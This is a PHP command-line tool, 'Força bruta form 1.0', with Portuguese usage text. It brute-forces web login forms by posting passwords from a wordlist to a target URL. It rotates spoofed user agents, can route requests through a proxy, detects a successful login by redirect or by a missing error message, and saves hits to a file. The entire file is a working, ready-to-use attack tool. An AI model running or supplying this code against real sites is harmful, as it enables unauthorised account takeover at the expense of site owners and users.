<?php
error_reporting(0);
set_time_limit(0);
ini_set('display_errors', 0);
ini_set('max_execution_time',0);
ini_set('allow_url_fopen', 1);




echo "
\033[01;31m----------------------------------------------------------------------------------------------------------------\033[0m\r\n
\033[01;31m
 ____             _         ______                            ______                         __        ___  
 |  _ \           | |       |  ____|                          |  ____|                       /_ |      / _ \ 
 | |_) |_ __ _   _| |_ ___  | |__ ___  _ __ ___ ___   ______  | |__ ___  _ __ _ __ ___  ___   | |     | | | |
\033[0m |  _ <| '__| | | | __/ _ \ |  __/ _ \| '__/ __/ _ \ |______| |  __/ _ \| '__| '_ ` _ \/ __|  | |     | | | |
 | |_) | |  | |_| | ||  __/ | | | (_) | | | (_|  __/          | | | (_) | |  | | | | | \__ \  | |  _  | |_| |
 |____/|_|   \__,_|\__\___| |_|  \___/|_|  \___\___|          |_|  \___/|_|  |_| |_| |_|___/  |_| (_)  \___/ \033[0m\r\n
     

 URL POST:\033[01;31m{$alvopost}\033[0m
 POST CAMPOS:\033[01;31m {$post}\033[0m\n                                                                                                
 Força bruta form 1.0
 By:GoogleINURL
 Exemplo de uso:\n
 \033[01;31mphp bruteforms.php urlpost post senhas tipo validação proxy\r\n
 
 \033[01;31mAjuda: ./bruteforms.php ajuda\r\n
 \033[0m
 Validação[1] por url.\r\n
 php bruteforms.php --urlpost='http://url/validarLogin.php' 'usuario=admin&senha=[SENHA]' --arquivo='senhas.txt' --tipo='1' --validar='http://url/admin/index.php'.\r\n
 Validação[2] por erro.\r\n
 php bruteforms.php --urlpost='http://url/validarLogin.php' 'usuario=admin&senha=[SENHA]' --arquivo='senhas.txt' --tipo='2' --validar='login erro'.\r\n

 Referente proxy basta o mesmo ser setado --proxy='exemplo:8080'.\033[01;31m

\033[01;31m----------------------------------------------------------------------------------------------------------------\033[0m\r\n\r\n
";



if(isset($argv[1]) && $argv[1] == "ajuda"){
system("command clear");
echo "
\033[01;31m----------------------------------------------------------------------------------------------------------------
//  ###########_###########_#######_#
//  #####/\###(_)#########|#|#####|#|
//  ####/##\###_#_###_##__|#|#__#_|#|
//  ###/#/\#\#|#|#|#|#|/#_`#|/#_`#|#|
//  ##/#____#\|#|#|_|#|#(_|#|#(_|#|_|
//  #/_/####\_\#|\__,_|\__,_|\__,_(_)
//  #########_/#|####################
//  ########|__/#####################\033[0m\r\n

 Exemplo de uso:\r\n
 php bruteforms.php urlpost post senhas tipo validação proxy\r\n

\033[01;31m--urlpost + post: Definir url de validação post\033[0m\r\n
ex: --urlpost='http://localhost/validarLogin.php' 'usuario=admin&senha=[SENHA]',\r\n
È necessario definir o argumento [SENHA] dessa forma o script seta senha\r\n
vindo do arquivo.\r\n

\033[01;31m--arquivo: Definir arquivo com senhas.\033[0m\r\n
ex:--arquivo='senhas.txt'\r\n

\033[01;31m--tipo: Existe dois tipos de validação\033[0m\r\n
tipo[1]: Efetua o teste de validação baseado na url de retorno.\r\n
ex[1]: --tipo='1', OBS se o teste de senha\r\n
retornar a url setada significa que login e senha OK.\r\n
tipo[2]: Efetua o teste de validação baseado no erro de retorno.\r\n
ex[2]: --tipo='2', OBS se urlpost retornar msg diferente do\r\n
setado em tipo[2] é login OK. \r\n
--tipo='1' ou --tipo='2'\r\n


\033[01;31m--validar: Onde é armazenado o conteúdo de validação de acordo com --tipo.\033[0m\r\n
ex:[1]: --tipo='1' --validar='http://localhost/admin/index.php',valida com url logada.\r\n
ex:[2]: --tipo='2' --validar='login erro',valida com erro de retorno.\r\n

\033[01;31m--proxy: Setar o proxy.\033[0m\r\n
ex: --proxy='exemplo:8080',OBS para não usar basta não informa o mesmo.\r\n


\033[01;31mExemplo\033[0m\r\n
Alvo:http://localhot\r\n
Validação[1] por url.\r\n

php bruteforms.php --urlpost='http://localhot/validarLogin.php' 'usuario=admin&senha=[SENHA]' --arquivo='senhas.txt' --tipo='1' --validar='http://localhost/admin/index.php'.\r\n

Validação[2] por erro.\r\n
php bruteforms.php --urlpost='http://localhot/validarLogin.php' 'usuario=admin&senha=[SENHA]' --arquivo='senhas.txt' --tipo='2' --validar='login erro'.\r\n

Referente proxy basta o mesmo ser setado --proxy='exemplo:8080'.\r\n

\033[01;31m----------------------------------------------------------------------------------------------------------------\033[0m\r\n
";exit;
}
// --urlpost='http://172.16.0.77/validarLogin.php' 'cpf=123456&senha=[SENHA]'   --arquivo='senhas.txt'--tipo='1' --validar='http://172.16.0.77/principal.php'

if(isset($_SERVER['argv'][1])){$alvopost =validar($_SERVER['argv'],1,'urlpost'); }
else{print"Defina a url post.\r\n"; $alvopost=''; exit;}
if(isset($_SERVER['argv'][2])){$post = $_SERVER['argv'][2];//validar($argv,2,'post');
}else{print"Defina o post.\r\n"; exit;}
if(isset($_SERVER['argv'][3])){$arquivo=validar($_SERVER['argv'],3,'arquivo');}
else{print "Defina o arquivo com senhas.\r\n"; exit;}
if(isset($_SERVER['argv'][4])){$validatipo =validar($_SERVER['argv'],4,'tipo');}
else{print "Defina o tipo de validação.\r\n";$validatipo=''; exit;}
if(isset($_SERVER['argv'][5])){$validarurl=validar($_SERVER['argv'],5,'validar'); }
else{print "Defina uma validação.\r\n"; exit;}
if(isset($_SERVER['argv'][6])){$proxy =validar($_SERVER['argv'],6,'proxy');}
else{$proxy='';}
if(!file_exists($arquivo)){echo "Arquivo {$arquivo} não existe.\r\n"; exit;}
$arquivo = fopen($arquivo, "r");

if(isset($alvopost) && !empty($alvopost)){ 
system("command clear");
echo "
\033[01;31m----------------------------------------------------------------------------------------------------------------\033[0m\r\n
\033[01;31m

 ____             _         ______                            ______                         __        ___  
 |  _ \           | |       |  ____|                          |  ____|                       /_ |      / _ \ 
 | |_) |_ __ _   _| |_ ___  | |__ ___  _ __ ___ ___   ______  | |__ ___  _ __ _ __ ___  ___   | |     | | | |
\033[0m |  _ <| '__| | | | __/ _ \ |  __/ _ \| '__/ __/ _ \ |______| |  __/ _ \| '__| '_ ` _ \/ __|  | |     | | | |
 | |_) | |  | |_| | ||  __/ | | | (_) | | | (_|  __/          | | | (_) | |  | | | | | \__ \  | |  _  | |_| |
 |____/|_|   \__,_|\__\___| |_|  \___/|_|  \___\___|          |_|  \___/|_|  |_| |_| |_|___/  |_| (_)  \___/ \033[0m\r\n
     

 
 URL POST:\033[01;31m{$alvopost}\033[0m\r\n
 POST CAMPOS:\033[01;31m {$post}\033[0m\r\n
                                                                                                        
 Força bruta form 1.0\r\n
 By:Googleinurl
 Exemplo de uso:\r\n
 \033[01;31mphp bruteforms.php urlpost post senhas tipo validação proxy\r\n
 
 \033[01;31mAjuda ./bruteforms.php ajuda\r\n


\033[01;31m----------------------------------------------------------------------------------------------------------------\033[0m\r\n\r\n

 Começando força bruta...\r\n
";
sleep(1);
}else{ echo "Defina a url post"; exit; } 


$i = 1;
$cont = 0;
function validarHead($filtrar, $palavras,$resultado=0) {
      foreach ($palavras as $key=>$value) {
      $pos = strpos($filtrar, $value);
      if ($pos !== false) { $resultado = 1;  }
      }
  return $resultado;
}


function argumentos($argv,$campo) {
    $_ARG = array();
    foreach ($argv as $arg) {
        if (ereg('--[a-zA-Z0-9]*=.*',$arg)) {
            $str = split("=",$arg); $arg = '';
            $key = ereg_replace("--",'',$str[0]);
            for ( $i = 1; $i < count($str); $i++ ) {
                $arg .= $str[$i];
            }
                        $_ARG[$key] = $arg;
        } elseif(ereg('-[a-zA-Z0-9]',$arg)) {
            $arg = ereg_replace("-",'',$arg);
            $_ARG[$arg] = 'true';
        }
   
    }
return $_ARG[$campo];
}


function validar($argv,$id,$campo){

if(isset($argv[$id]) && ereg('--[a-zA-Z0-9]*=.*',$argv[$id]) && !empty($argv[$id])){ 

$validacao=argumentos($argv,$campo);
}
return $validacao;
}

function gerarUserAgent($i){
if($i == 0){$i = "Opera/9.80 (X11; U; Linux i686; en-US; rv:1.9.{$i}.3) Presto/2.2.15 Version/10.{$i}"; return $i; }
if($i == 1){$i = "Mozilla/4.0 (compatible; MSIE 6.{$i}; X11; Linux i686; en) Opera 9.{$i}"; return $i; }
if($i == 2){$i = "Mozilla/4.0 (compatible; MSIE 9.{$i}; Windows NT 5.1; Trident/5.{$i})";return $i; }
if($i == 3){$i =  "Safari/531.21.{$i}";return $i; }
}

while(!feof($arquivo)) {
$senha = fgets($arquivo,1024);
$senha = str_replace("\r",'', $senha);
$senha = str_replace("\n",'', $senha); 
$senha = str_replace("\t",'', $senha);

$post_data = str_replace('[SENHA]',$senha,$post);


$ch = curl_init();
curl_setopt($ch, CURLOPT_RETURNTRANSFER,1);

if(isset($proxy) && !empty($proxy) && $proxy!=0 ){curl_setopt($ch, CURLOPT_PROXY, $proxy);}

curl_setopt($ch, CURLOPT_URL,$alvopost);
curl_setopt($ch, CURLOPT_USERAGENT,gerarUserAgent($i));
curl_setopt($ch, CURLOPT_POST, 1);
//curl_setopt($ch, CURLOPT_VERBOSE, 1);
curl_setopt($ch, CURLOPT_HEADER, 1); // get the header 


curl_setopt($ch, CURLOPT_POSTFIELDS,$post_data);
curl_setopt($ch, CURLOPT_REFERER,$alvopost);
curl_setopt($ch, CURLOPT_TIMEOUT, 3);
curl_setopt($ch, CURLOPT_LOW_SPEED_LIMIT, 3);
curl_setopt($ch, CURLOPT_LOW_SPEED_TIME, 3);
curl_setopt($ch, CURLOPT_COOKIEJAR, "/tmp/cookie_$alvopost");
$buf = curl_exec ($ch);
$info = curl_getinfo($ch);

list($header) = explode("\r\n\r\n", $buf, 2);
preg_match('/(Location:|URI:)(.*?)\n/', $header, $vaurl);

$url_final = trim(str_replace("Location:", "", $vaurl['0']));
$url_final = trim(str_replace("URI:", "", $url_final));



echo "[\033[01;31m$cont\033[0m] - POST:\033[01;24m $post_data\r\n\033[0m";
echo "TIPO: \033[01;36m{$validatipo}\r\n\033[0m";
echo "VALIDAÇÃO:\033[01;35m {$validarurl}\r\n\033[0m";
echo "URL RESULTADO:\033[01;34m {$url_final}\r\n\033[0m";
echo "USERAGENT:\033[01;33m".gerarUserAgent($i)."\r\n\033[0m";
echo "PROXY:\033[01;30m $proxy\r\n\033[0m";


if($validatipo == '1'){
if (strstr($url_final, $validarurl)){
$resultado = "\033[01;32m[Acesso concedido]\r\n$post_data\r\n\r\n";
echo $resultado;
$abrirtxt = fopen("resultado".date("H-i-s").".txt", "a");
$escreve = fwrite($abrirtxt, $resultado."\n\r");
fclose($abrirtxt);
exit;
}
}
if($validatipo == '2'){
$erro = array($validarurl);
if(!validarHead($buf,$erro)){
var_dump($buf);
$resultado = "\033[01;32m[Acesso concedido]\r\n$post_data\r\n\r\n";
echo $resultado;
$abrirtxt = fopen("resultado".date("H-i-s").".txt", "a");
$escreve = fwrite($abrirtxt, $resultado."\n\r");
fclose($abrirtxt);
exit;
}
}

echo "\033[01;31m----------------------------------------------------------------------------------------------------------------\033[0m\r\n";


curl_close($ch);

unset($ch);

$i++;
$cont++;
$i = ($i==4)?0:$i=$i;
}
ob_flush();
flush();
?>
